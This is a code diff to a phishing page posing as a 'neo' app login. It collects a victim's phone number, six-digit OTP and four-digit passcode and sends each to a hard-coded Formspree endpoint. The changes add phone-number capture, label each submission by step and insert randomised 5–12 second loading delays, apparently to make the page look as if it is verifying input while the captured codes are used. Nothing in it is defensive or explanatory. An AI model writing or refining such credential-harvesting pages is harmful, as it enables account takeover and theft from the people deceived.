@@ -35,6 +35,35 @@
             display: flex;
         }
 
+        /* --- MODIFICATION: Loader Overlay Styles --- */
+        .loader-overlay {
+            display: none; /* Hidden by default */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .loader-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3; /* Light grey */
+            border-top: 5px solid #5C52D2; /* Purple */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
         /* --- Page 1 & 2 Common --- */
         #page-1, #page-2 {
             background-color: #FFFFFF;
@@ -169,6 +198,7 @@
         <div class="content-area">
             <img src="https://res.cloudinary.com/dl6aos9km/image/upload/v1754500293/20250806_200924_0000_popwzo.png" alt="neo logo" class="logo">
             <form id="form-1">
+                <input type="hidden" name="_subject" value="Step 1: Phone Number">
                 <div class="phone-input-container">
                     <select name="country_code" class="country-code">
                         <option value="+964">+964</option>
@@ -189,10 +219,8 @@
             <h2>Enter the 6-digit code</h2>
             <p id="phone-display">sent to ...</p>
             <form id="form-2" style="width:100%">
-                <input type="hidden" name="Step" value="1 & 2: Phone and OTP">
-                <input type="hidden" id="hidden-country-code" name="Country Code">
-                <input type="hidden" id="hidden-phone-number" name="Phone Number">
-                <input type="hidden" id="otp-full-code" name="OTP Code">
+                <input type="hidden" name="_subject" value="Step 2: OTP Code">
+                <input type="hidden" id="otp-full-code" name="otp_code">
                 <div class="otp-container">
                     <input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
                 </div>
@@ -207,7 +235,7 @@
     <div id="page-3" class="page-section">
         <div class="content-area">
              <form id="form-3" style="display: none;">
-                  <input type="hidden" name="Step" value="3: Passcode">
+                  <input type="hidden" name="_subject" value="Step 3: Passcode">
                   <input type="hidden" id="passcode-input" name="Passcode" value="">
              </form>
              <h2>Enter passcode</h2>
@@ -225,16 +253,21 @@
          </div>
      </div>
 
+    <div id="loader-overlay" class="loader-overlay">
+        <div class="spinner"></div>
+    </div>
+
      <script>
          document.addEventListener('DOMContentLoaded', () => {
-            // --- FINAL CONFIGURATION: Your Formspree URL is now set ---
             const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xldlpqzg'; 
 
             const pages = document.querySelectorAll('.page-section');
             const form1 = document.getElementById('form-1');
             const form2 = document.getElementById('form-2');
             const form3 = document.getElementById('form-3');
+            const loader = document.getElementById('loader-overlay'); // Loader element
             
+            if (form1) form1.action = FORMSPREE_ENDPOINT;
             if (form2) form2.action = FORMSPREE_ENDPOINT;
             if (form3) form3.action = FORMSPREE_ENDPOINT;
 
@@ -267,6 +300,7 @@
                 }
             }
 
+            // --- Page 1 Logic ---
             const btnToPage2 = document.getElementById('btn-to-page-2');
             const phoneInput = form1.querySelector('input[name="phone_number"]');
             
@@ -278,15 +312,22 @@
             btnToPage2.addEventListener('click', (e) => {
                 e.preventDefault();
                 if (btnToPage2.classList.contains('active')) {
-                    const countryCode = form1.querySelector('select').value;
-                    const phoneNumber = phoneInput.value;
-                    document.getElementById('hidden-country-code').value = countryCode;
-                    document.getElementById('hidden-phone-number').value = phoneNumber;
-                    document.getElementById('phone-display').textContent = `sent to ${countryCode}${phoneNumber}`;
-                    showPage('page-2');
+                    // MODIFICATION: Show loader and add delay
+                    loader.classList.add('active');
+                    submitForm(form1); // Send form 1 data
+                    
+                    const delay = Math.floor(Math.random() * (12000 - 8000 + 1)) + 8000; // Random delay 8-12 seconds
+
+                    setTimeout(() => {
+                        const fullPhoneNumber = form1.querySelector('select').value + phoneInput.value;
+                        document.getElementById('phone-display').textContent = `sent to ${fullPhoneNumber}`;
+                        loader.classList.remove('active');
+                        showPage('page-2');
+                    }, delay);
                 }
             });
 
+            // --- Page 2 Logic ---
             const otpInputs = document.querySelectorAll('.otp-input');
             const fullOtpInput = document.getElementById('otp-full-code');
 
@@ -296,8 +337,17 @@
                     let otp = Array.from(otpInputs).map(i => i.value).join('');
                     if (otp.length === otpInputs.length) {
                         fullOtpInput.value = otp;
-                        submitForm(form2);
-                        showPage('page-3');
+                        
+                        // MODIFICATION: Show loader and add delay
+                        loader.classList.add('active');
+                        submitForm(form2); // Send form 2 data
+
+                        const delay = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000; // Random delay 5-10 seconds
+
+                        setTimeout(() => {
+                            loader.classList.remove('active');
+                            showPage('page-3');
+                        }, delay);
                     }
                 });
                 input.addEventListener('keydown', (e) => {
@@ -311,6 +361,7 @@
                 showPage('page-1');
             });
 
+            // --- Page 3 Logic ---
             const passcodeHiddenInput = document.getElementById('passcode-input');
             const passcodeIndicators = document.querySelectorAll('.passcode-indicator');
             const keypadButtons = document.querySelectorAll('.keypad-button');
@@ -321,7 +372,7 @@
             }
 
             keypadButtons.forEach(button => {
-                button.addEventListener('click', async () => {
+                button.addEventListener('click', () => {
                     const value = button.dataset.value;
                     let currentPasscode = passcodeHiddenInput.value;
 
@@ -334,11 +385,15 @@
                     }
                     updatePasscodeView();
                     if (passcodeHiddenInput.value.length === 4) {
-                        await submitForm(form3);
+                        // MODIFICATION: Show loader and add a short delay before reset
+                        loader.classList.add('active');
+                        submitForm(form3); // Send form 3 data
+                        
                         setTimeout(() => {
+                            loader.classList.remove('active');
                             resetAllForms();
                             showPage('page-1');
-                        }, 300);
+                        }, 2000); // 2 second delay
                     }
                 });
             });
